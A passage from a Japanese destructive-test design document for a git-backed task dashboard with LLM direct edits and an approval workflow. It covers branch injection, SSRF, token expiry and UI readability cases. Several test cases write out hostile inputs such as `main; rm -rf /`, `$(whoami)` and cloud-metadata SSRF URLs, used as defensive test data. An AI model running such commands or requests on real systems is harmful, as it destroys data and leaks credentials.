- Green 条件: border / shadow は本文色より控えめな色（中間色や淡色）を使い、テキストと装飾が競合しないこと。§2.7.6 item 14「border / shadow / background は本文色と競合しない控えめな装飾」が遵守されること。

### DT-38: approve 処理中に GITHUB_TOKEN が失効

- 攻撃シナリオ: approve 処理開始時はトークンが有効だが、fetch → merge → push の途中でトークンが失効する。local merge は成功するが push が認証エラーになる。
- Red 条件: local repo に merge commit が残り、push されないまま task が `succeeded` になる。または branch cleanup が走り変更が消失する。
- Green 条件: push 失敗を検出し、task を `blocked` に遷移させること。branch cleanup は push 成功後にのみ実行されるため、push 失敗時は working_branch が保全されること。

### DT-39: branches API — remote リポジトリが削除済み / アクセス不能

- 攻撃シナリオ: `GET /api/v1/repositories/branches?repository_url=...` で指定されたリポジトリが削除されたか、トークンの権限が取り消された状態。
- Red 条件: ハンドルされない subprocess エラーまたは 500 でサーバがクラッシュする。
- Green 条件: git 操作失敗をキャッチし、適切なエラーレスポンス（`502 Bad Gateway` または `503 Service Unavailable`）を返すこと。

### DT-40: 保存済み target_ref にコマンドインジェクション文字

- 攻撃シナリオ: DB 上の target_ref に `main; rm -rf /` や `$(whoami)` を含む不正文字列が格納されている（投稿時バリデーション不備、DB 直接改竄等）。approve 処理でこの値が `subprocess` の引数に渡される。
- Red 条件: コマンドインジェクションが成功し、任意コマンドが実行される。
- Green 条件: branch 名は `subprocess.run()` の list 引数で渡され、shell=True は使用されないこと。加えて approve 処理開始時に target_ref が `^[a-zA-Z0-9._/-]+$` パターンに適合することを再検証し、不正な文字を含む場合は拒否すること。

### DT-41: branches API — repository_url にコマンドインジェクション

- 攻撃シナリオ: `GET /api/v1/repositories/branches?repository_url=https://github.com/x/y;rm+-rf+/` のように repository_url にシェルメタ文字を含める。
- Red 条件: コマンドインジェクションが成功し、任意コマンドが実行される。
- Green 条件: repository_url は `subprocess.run()` の list 引数で渡され、shell=True は使用されないこと。加えて URL 形式の事前検証で不正な文字を含む URL は拒否すること。

### DT-42: branches API — repository_url に SSRF (内部ネットワーク URL)

- 攻撃シナリオ: `repository_url=http://169.254.169.254/latest/meta-data/` や `http://localhost:3306/` など内部ネットワーク・メタデータサービスの URL を指定する。
- Red 条件: git ls-remote が内部ネットワークにアクセスし、メタデータやサービス情報を漏洩する。
- Green 条件: repository_url のスキーム・ホスト名を検証し、HTTPS GitHub URL のみを許可すること。内部ネットワークアドレスやプライベート IP レンジへのアクセスは拒否すること。

### DT-43: branches API — repository_url が空 / 不正形式

- 攻撃シナリオ: `repository_url` パラメータが空文字、未指定、または `ftp://malicious.example.com/repo` のように不正なスキームの URL。
- Red 条件: ハンドルされない例外またはサーバクラッシュ。
- Green 条件: `400 Bad Request` を返し、有効な GitHub HTTPS URL が必須であることを明示すること。

### DT-44: branches API — GITHUB_TOKEN 失効時のブランチ一覧取得

- 攻撃シナリオ: GITHUB_TOKEN が失効した状態で `GET /api/v1/repositories/branches?repository_url=...` を呼び出す。
- Red 条件: ハンドルされない認証エラーまたは 500 でサーバがクラッシュする。エラーメッセージにトークン値が漏洩する。
- Green 条件: 認証失敗をキャッチし、適切なエラーレスポンスを返すこと。エラーメッセージにトークン値を含めないこと。

### DT-45: branches API — allowlist にマッチするブランチが 0 件

- 攻撃シナリオ: リポジトリには `feature/xxx`、`bugfix/yyy` のみ存在し、allowlist の `main` / `develop` が一切存在しない。
- Red 条件: 空配列ではなくフィルタなしの全ブランチが返される、または 500 エラー。
- Green 条件: 空配列 `[]` を正常レスポンスとして返し、フロントエンドが「候補ブランチなし」を適切に表示できること。

### DT-46: branches API — ブランチ一覧取得がタイムアウト

- 攻撃シナリオ: `git ls-remote` がネットワーク障害で無期限にハングする。
- Red 条件: Dashboard のリクエストハンドラがブロックされ、他リクエストが処理不能になる。
- Green 条件: git 操作にタイムアウトを設定し（`subprocess.run(timeout=...)`）、超過時は適切なエラーレスポンスを返すこと。

### DT-47: task 投稿時に target_ref が未指定

- 攻撃シナリオ: GitHub clone task の投稿フォームから API を直接呼び出し、`target_ref` フィールドを省略または空文字で送信する。
- Red 条件: target_ref が NULL / 空のまま task が作成され、後続の clone / diff / approve で未定義動作が発生する。
- Green 条件: GitHub clone task では target_ref が必須であることを検証し、未指定時は `400 Bad Request` で拒否すること。local workspace_path task では target_ref は不要。

### DT-48: task 投稿時に allowlist 外のブランチを target_ref に指定

- 攻撃シナリオ: クライアント側改竄により、branches API が返さなかった allowlist 外ブランチ（`production`、`release/v1`）を target_ref として投稿する。
- Red 条件: allowlist 外ブランチが target_ref として保存され、承認時にそのブランチへ merge が試行される。
- Green 条件: 投稿受付時にも target_ref の allowlist 検証を行い、allowlist 外なら `400 Bad Request` で拒否すること。

### DT-49: task 投稿時に target_ref にインジェクション文字列

- 攻撃シナリオ: target_ref に `main; rm -rf /` や `$(whoami)` を含む文字列を投稿する。
- Red 条件: 不正な target_ref が DB に保存され、後続の git 操作でコマンドインジェクションが発生する。
- Green 条件: target_ref が `^[a-zA-Z0-9._/-]+$` パターンに適合するかを投稿受付時に検証し、不正な場合は `400 Bad Request` で拒否すること。

### DT-50: approve API が payload の merge_target で保存済み target_ref を上書き

- 攻撃シナリオ: `POST /api/v1/tasks/{id}/approve` の request body に `{"merge_target": "production"}` を含め、投稿時に選択した `main` を `production` に上書きしようとする。
- Red 条件: payload の merge_target が保存済み target_ref を上書きし、意図しないブランチへ merge される。
- Green 条件: approve API は payload の merge_target フィールドを無視し、task に保存済みの target_ref のみを使用すること。§2.7.2 item 3「payload でマージ先ブランチを上書きしてはならない」が遵守されること。

### DT-51: diff API がクエリパラメータで保存済み target_ref を上書き

- 攻撃シナリオ: `GET /api/v1/tasks/{id}/diff?target=production` のようにクエリパラメータで比較先ブランチを指定し、保存済みの `main` を `production` に変えようとする。
- Red 条件: クエリパラメータのブランチが比較対象に使われ、保存値と異なるブランチとの差分が返される。
- Green 条件: diff API はクエリパラメータの target を無視し、task に保存済みの target_ref のみを比較対象として使用すること。§2.7.2 item 2「比較先は request payload ではなく task の保存値を使う」が遵守されること。

### DT-52: DB 上の target_ref が NULL / 空 / 不正値に改竄

- 攻撃シナリオ: DB の直接操作やバグにより、task の target_ref が `NULL`、空文字、または不正な文字列に変更されている状態で approve または diff を実行する。
- Red 条件: ハンドルされない NoneType エラー、空文字の git 引数で未定義動作、または不正な git 操作が実行される。
- Green 条件: approve / diff 処理開始時に target_ref の存在と形式を検証し、不正な場合は操作を拒否して task を `blocked` に遷移させること。

### DT-53: 承認画面にマージ先 select UI が残存

- 攻撃シナリオ: 設計変更前の merge-target select UI (`#task-merge-target`) が承認画面に残ったまま、ユーザが別ブランチを選択して approve を送信する。
- Red 条件: ユーザが承認画面でマージ先を変更でき、選択したブランチが approve 処理に影響する。
- Green 条件: 承認画面に merge-target select UI が存在しないこと。§2.7.5 item 4「承認画面ではマージ対象ブランチの select UI を表示せず」が遵守されること。

### DT-54: task detail にリポジトリ URL と元ブランチが未表示

- 攻撃シナリオ: GitHub clone task の task detail にリポジトリ URL と投稿時選択済みの元ブランチが表示されず、承認者が merge 先を確認できないまま approve を押す。
- Red 条件: 承認者が merge 先を目視確認できない。
- Green 条件: task detail に `repository_path` と `target_ref` が表示され、承認者が merge 対象を明確に把握できること。§2.7.5 item 3 が遵守されること。

### DT-55: URL 入力後にブランチコンボボックスが未反映

- 攻撃シナリオ: GitHub clone task の投稿フォームでリポジトリ URL を入力したが、branches API 呼び出しが行われずコンボボックスが空のまま。ユーザが target_ref を選択できずに投稿する。
- Red 条件: target_ref が未選択のまま投稿可能、または投稿がブロックされて操作不能。
- Green 条件: リポジトリ URL 入力後に branches API を呼び出してコンボボックスを動的に表示し、候補がない場合は「ブランチなし」を表示すること。§1.1 非機能 10 に準拠すること。

### DT-56: ブランチコンボボックスに allowlist 外ブランチが表示されるが投稿は拒否

- 攻撃シナリオ: branches API のレスポンスを改竄するか、ブラウザ DevTools でコンボボックスに allowlist 外ブランチを追加し、そのブランチを選択して投稿する。
- Red 条件: allowlist 外ブランチでの投稿が受理され、task の target_ref に保存される。
- Green 条件: フロントエンドは branches API のレスポンスをそのまま表示するが、バックエンドの投稿受付時検証（DT-48）が二重防御として機能し、allowlist 外ブランチでの投稿は拒否されること。

## 3. RED で確認すべき項目

### 3.1 直接編集アーキテクチャ（DT-01〜DT-20）

1. **prompt 転換**: 旧ガードレール 5 行が `_build_prompt()` から完全に撤去され、直接編集指示に置き換わっていること（DT-01〜03）。
2. **変更なし処理**: copilot が何も編集しなかった場合に空 commit が作成されず、`logs` に記録されること（DT-04）。
3. **sandbox 検証**: `validate_changed_files()` が `..`、絶対パス、`.git/`、symlink を含む変更パスを拒否すること（DT-05〜08）。
4. **commit/push 失敗の閉じ込め**: commit 失敗、push 認証失敗、リモート拒否が task 単位で `blocked` に閉じ込められ、worker が次 task を処理可能なこと（DT-09, DT-11〜12, DT-18）。
5. **秘密情報保護**: commit message と commit 内容に `GITHUB_TOKEN` やその他秘密情報が平文で含まれないこと（DT-10, DT-13）。
6. **旧パス廃止**: `apply_artifact()` / `apply_artifact_for_task()` の呼び出しパスが削除または無効化されていること（DT-15）。
7. **remote 固定**: push 先が常に `origin` にハードコードされ、copilot や task payload による上書きが不可能なこと（DT-16）。
8. **資源保護**: 大量ファイル変更・git 操作タイムアウトに対する上限があること（DT-17〜18）。
9. **前提条件検証**: `working_branch` が有効であること（DT-20）。

### 3.2 承認ワークフロー（DT-21〜DT-40）

10. **approve/reject ガード**: `waiting_approval` 以外の task に対する approve/reject が `409` で拒否され、存在しない task が `404` で返されること（DT-21, DT-22, DT-31）。
11. **approve 冪等性**: 二重 approve が task 状態確認で吸収され、二重 merge / 二重 branch 削除が発生しないこと（DT-23）。
12. **merge 失敗の閉じ込め**: merge 競合、push 拒否、保護ブランチ拒否が `blocked` へ遷移し、worker を巻き込まないこと（DT-24, DT-27, DT-38）。
13. **allowlist 検証**: merge target が allowlist 外の場合は拒否され、merge が実行されないこと（DT-25, DT-35）。
14. **branch cleanup 順序保証**: cleanup は merge push 成功後にのみ実行され、片肺故障時は区別可能な event で `blocked` に遷移すること（DT-28, DT-29, DT-30）。
15. **reject の安全性**: reject は状態遷移とログ記録のみを行い、merge・push・branch cleanup を一切実行しないこと（DT-32）。
16. **diff API ガード**: working_branch 未設定 task や存在しない merge target に対して安全にエラーを返すこと（DT-33, DT-34）。
17. **CSRF 防御**: approve/reject API が外部オリジンからのリクエストを拒否すること（DT-36）。
18. **local task 隔離**: local `workspace_path` task が `waiting_approval` に遷移しないこと（DT-37）。
19. **インジェクション防止**: branch 名にコマンドインジェクションが含まれていても `subprocess` list 引数と allowlist で防御されること（DT-40）。
20. **remote 障害耐性**: remote リポジトリがアクセス不能時に branches API が安全にエラーを返すこと（DT-39）。

### 3.3 投稿時ブランチ選択（DT-41〜DT-56）

21. **branches API 安全性**: repository_url のインジェクション・SSRF・不正形式・認証失敗・タイムアウトに対して安全にエラーを返すこと（DT-41〜46）。
22. **投稿時ブランチ検証**: target_ref の必須検証・allowlist 検証・インジェクション防止が投稿受付時に実施されること（DT-47〜49）。
23. **固定マージ先不変性**: approve / diff API が payload / クエリパラメータによる上書きを拒否し、保存済み target_ref のみを使用すること（DT-50〜51）。
24. **DB 保存値の安全性**: target_ref の NULL / 空 / 不正値に対して approve / diff 処理が安全に失敗すること（DT-52）。
25. **UI 整合性**: 承認画面に merge-target select が存在せず、task detail に URL / ブランチが表示され、投稿フォームでブランチコンボボックスが動作すること（DT-53〜56）。

### 3.4 Dashboard detail / subtask アコーディオン（DT-59〜DT-66）

26. **アコーディオン初期状態**: 全 subtask が初期状態で collapsed であり、明示クリックでのみ展開されること（DT-59）。
27. **ヘッダ表示**: アコーディオンヘッダに phase 番号、task_type、status、LLM モデル名が表示されること。null / 空の llm_model は「N/A」で表示されること（DT-60, DT-63）。
28. **展開領域**: 展開時に handoff_message、phase_summary、result_summary_md、主要ログが表示されること（DT-61）。
29. **instruction 表示**: root task 詳細に「依頼本文」が表示され、改行が保持されること（DT-62, DT-64）。
30. **改行保持**: instruction と handoff_message の改行コードが UI 上で保持されること（DT-64, DT-65）。
31. **空 subtasks 耐性**: subtasks が 0 件の root task で詳細画面がエラーにならないこと（DT-66）。

### 3.5 可読性・日本語 UX（DT-67〜DT-74）

32. **日本語見出し**: detail 画面の主要見出しが「依頼本文」「サブタスク」「引き継ぎ事項」「結果」「ログ」の日本語第一表記であること。英語ラベルが残存していないこと（DT-67）。
33. **テキストブロック視覚的分離**: instruction / handoff_message / result_summary_md が補助メタデータと異なる専用スタイル（padding, background, border, line-height）で描画されること（DT-68）。
34. **読み物向けパネル**: テキストブロックの行間・余白・背景色・境界線が「読む領域」として明確に分離されていること（DT-69, DT-70）。
35. **subtask 展開ラベル日本語化**: subtask アコーディオン展開領域のラベルが「要約」「引き継ぎ事項」「結果」「ログ」に置換されていること（DT-71）。
36. **日本語 empty state**: empty state、helper text、プレースホルダが日本語で記述されていること。エラー時に英語内部用語が露出しないこと（DT-72, DT-74）。
37. **情報階層順序**: detail 画面の表示順が「概要 → 依頼本文 → サブタスク → ログ/結果」に従っていること（DT-73）。

### 3.6 コントラスト・色階層（DT-75〜DT-79）

38. **パネル本文コントラスト**: `.detail-reading-panel` の `color` と `background` が明示的に指定され、十分なコントラスト差を持つこと。背景に埋もれないこと（DT-75）。
39. **色階層分離**: `.detail-section-title`（見出し）、`.detail-reading-panel`（本文）、補助メタデータの `color` が 3 層の階層として機能し、同一色に崩壊していないこと（DT-76）。
40. **hover/focus 耐性**: hover / focus 状態で本文文字色が変更されず、コントラストが維持されること（DT-77）。
41. **disabled 耐性**: disabled 相当の表示でも本文テキストが読め、opacity が極端に低下しないこと（DT-78）。
42. **装飾と本文の非競合**: border / shadow の色が本文色と競合せず、控えめに分離されていること（DT-79）。

## 4. 設計へのフィードバック

本書で以下の設計上の未確定事項を確定する:

### 4.1 直接編集アーキテクチャ

- **DT-04 確定**: 変更なし時の振る舞いは Phase 5 DT-09 の方針を踏襲し、フェーズ固有の判断に委ねる。フェーズ 0（設計書作成）やフェーズ 4（実装）など変更が期待されるフェーズで変更なしの場合は `blocked` へ遷移する。フェーズ間オーケストレーション（Feature #4）の実装時に詳細化する。
- **DT-13 確定**: copilot の直接編集ではシステムが中間 artifact を介さないため、commit 前の `git diff` 内容に対して秘密情報スキャンを行う。Phase 4 の `_sanitize_response()` のロジックを `commit_and_push()` 内に転用する。
- **DT-15 確定**: `apply_artifact()` と `apply_artifact_for_task()` は本 pivot で呼び出しパスから削除する。メソッド本体は `DeprecationWarning` 付きで残すか完全削除するかは実装時に判断するが、アクティブなコードパスからは必ず除去する。
- **DT-17 確定**: 変更ファイル数の上限は環境変数 `MAX_CHANGED_FILES`（デフォルト: 100）で制御する。超過時は `blocked` へ遷移し、`too_many_changed_files` イベントを `logs` に記録する。

### 4.2 承認ワークフロー

- **DT-25 確定**: merge target の allowlist は初期実装ではデフォルト `["main", "develop"]` とし、環境変数 `MERGE_TARGET_ALLOWLIST` で上書き可能とする。投稿時に allowlist 内であった target_ref が承認時に allowlist 外になっていた場合は merge を実行せず、task は `waiting_approval` のまま残す（`blocked` には落とさない）。
- **DT-29 確定**: remote branch 削除のみ失敗した場合は `blocked` に遷移し、`branch_cleanup_remote_failed` イベントを記録する。再実行時は local working_branch の存在を `git branch --list` で確認し、不在なら local 削除をスキップして remote 削除のみをリトライする。
- **DT-37 確定**: local `workspace_path` task は `waiting_approval` を経由しない。`task_backend.py` の状態遷移ロジックで `approval_required=false` (local task のデフォルト) の task は LLM 成功後に直接 `succeeded` へ遷移し、GitHub clone task のみが `waiting_approval` を経由する。
- **DT-40 確定**: branch 名は `subprocess.run()` の list 引数で渡し、`shell=True` は使用しない。approve 処理開始時に保存済み target_ref が `^[a-zA-Z0-9._/-]+$` パターンに適合しない場合は拒否する。投稿時と承認時の二重検証とする。

### 4.3 投稿時ブランチ選択

- **DT-41 確定**: repository_url は `subprocess.run()` の list 引数で渡し、`shell=True` は使用しない。URL 形式は `^https://github\.com/[a-zA-Z0-9._-]+/[a-zA-Z0-9._-]+(\.git)?$` パターンで事前検証する。
- **DT-42 確定**: SSRF 防止のため、repository_url は HTTPS スキームかつ `github.com` ドメインのみ許可する。プライベート IP レンジ・ローカルホスト・メタデータサービスアドレスへのアクセスは URL 検証で拒否する。
- **DT-46 確定**: `git ls-remote` にタイムアウトを設定する。DT-18 と同じく `subprocess.run(timeout=...)` で制御する。デフォルトタイムアウトは 30 秒とする。
- **DT-47 確定**: GitHub clone task への target_ref 必須検証は投稿 API で実施する。local workspace_path task では target_ref は無視する。
- **DT-48/49 確定**: 投稿受付時に target_ref の allowlist 検証と文字パターン検証の両方を実施する。branches API 側のフィルタ（DT-35）だけに依存せず、二重防御とする。
- **DT-50 確定**: approve API は request body から merge_target / target_ref フィールドを読み取らない。approve 処理は DB から task を取得し、保存済み target_ref のみを使用する。
- **DT-51 確定**: diff API はクエリパラメータ `target` を読み取らない。DB から task を取得し、保存済み target_ref のみを比較対象とする。

### 4.4 Dashboard detail / subtask アコーディオン

- **DT-59 確定**: subtask アコーディオンは HTML 描画時に `collapsed` クラスまたは `<details>` 要素の `open` 属性なしで生成し、初期状態で全 item を非展開とする。
- **DT-60/63 確定**: `llm_model` が null / undefined / 空文字の場合、ヘッダには `"N/A"` をフォールバック表示する。テンプレートリテラルで null が結合されないよう `|| 'N/A'` ガードを適用する。
- **DT-61 確定**: アコーディオン展開領域には `handoff_message` をラベル付きで必ず表示する。null / 空の場合は `"引き継ぎ事項なし"` を表示する。
- **DT-62 確定**: root task 詳細画面に「依頼本文」セクションを設け、`instruction` を `textContent` + `white-space: pre-wrap` で表示する。
- **DT-64/65 確定**: instruction と handoff_message の表示領域に `white-space: pre-wrap` を適用し、改行を保持する。innerHTML ではなく textContent で描画する。
- **DT-66 確定**: subtasks が空配列の場合、フロントエンドは「サブタスクなし」のプレースホルダを表示し、undefined / null イテレーションによるクラッシュを防止する。

### 4.5 可読性・日本語 UX

- **DT-67/71 確定**: 主要見出しは日本語第一表記とする。root detail のセクション見出しは「依頼本文」「サブタスク」。subtask 展開領域のフィールドラベルは「要約」「引き継ぎ事項」「結果」「ログ」とする。英語は phase 番号・LLM model 名等の識別用途に限定する。
- **DT-68/69/70 確定**: instruction / handoff_message / result_summary_md のテキストブロックには、周囲の補助メタデータと区別する専用 CSS クラスを適用する。少なくとも line-height: 1.6 以上、padding: 12px 以上、背景色または 1px 境界線で分離し、「読み物向けパネル」として設計する。既存の `.detail-text-block` を拡張または上書きする。
- **DT-72/74 確定**: empty state は日本語で記述する。少なくとも「サブタスクなし」「引き継ぎ事項なし」「結果なし」「ログなし」を準備する。API エラーコード（`working_branch_not_found` 等）はユーザー向け表示時に日本語メッセージへ変換し、内部用語は `console.error` / ログにのみ出力する。
- **DT-73 確定**: root detail の情報階層は「概要（status / repository / branch 等のメタ情報） → 依頼本文（instruction） → サブタスク（accordion） → 承認パネル」の順とする。subtask 展開領域の内部順は「要約 → 引き継ぎ事項 → 結果 → ログ」とする。

## 5. 関連ドキュメント

1. `docs/phase6-direct-edit-design.md`
2. `docs/phase5-artifact-apply-design.md` (旧設計・参考)
3. `docs/phase5-artifact-apply-destructive-test-design.md` (旧破壊テスト・参考)
4. `docs/phase4-llm-integration-design.md`
5. `docs/phase4-llm-integration-destructive-test-design.md`
### 4.6 コントラスト・色階層

- **DT-75 確定**: `.detail-reading-panel` は `color` に濃色（`#3a2f22` 相当）、`background` に淡色（`#faf6ef` 相当）を明示指定する。UA 既定に依存しない。色の選択は §2.7.6 item 13 の配色トークン分離に従い、「本文レイヤは濃色文字、背景は白寄り」を固守する。
- **DT-76 確定**: `.detail-section-title` は `color: var(--accent-strong)` 相当で本文よりさらに強い色とする。補助メタデータ（`--muted` 系）は本文より弱いが背景に埋もれない色とする。3 層の色階層: 見出し > 本文 > 補助文言を CSS カスタムプロパティまたは直値で維持する。
- **DT-77/78 確定**: hover / focus / disabled の視覚差は `border-color`、`box-shadow`、`background`（surface tint）のみで表現する。`color`（本文文字色）は通常時と同値を維持し、hover 等で変更しない。disabled 時の `opacity` は 0.65 以上を保証し、テキスト内容を読めることを優先する。
- **DT-79 確定**: `border-color` と `box-shadow` に本文 `color` と同値の濃色を使わず、中間色または淡色で装飾する。

6. `.tdd_protocol.md`
